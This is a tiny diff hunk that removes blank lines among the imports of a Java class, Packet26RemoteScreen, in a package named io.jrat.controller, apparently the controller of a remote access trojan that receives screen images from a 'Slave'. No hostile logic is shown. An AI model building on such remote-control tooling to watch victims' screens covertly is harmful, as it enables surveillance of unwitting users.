@@ -2,12 +2,10 @@ package io.jrat.controller.packets.incoming;
 
 import io.jrat.controller.Slave;
 import io.jrat.controller.ui.frames.FrameRemoteScreen;
-
 import java.awt.Graphics2D;
 import java.awt.image.BufferedImage;
 import java.io.ByteArrayInputStream;
 import java.io.DataInputStream;
-
 import javax.imageio.ImageIO;
 
 public class Packet26RemoteScreen extends AbstractIncomingPacket {
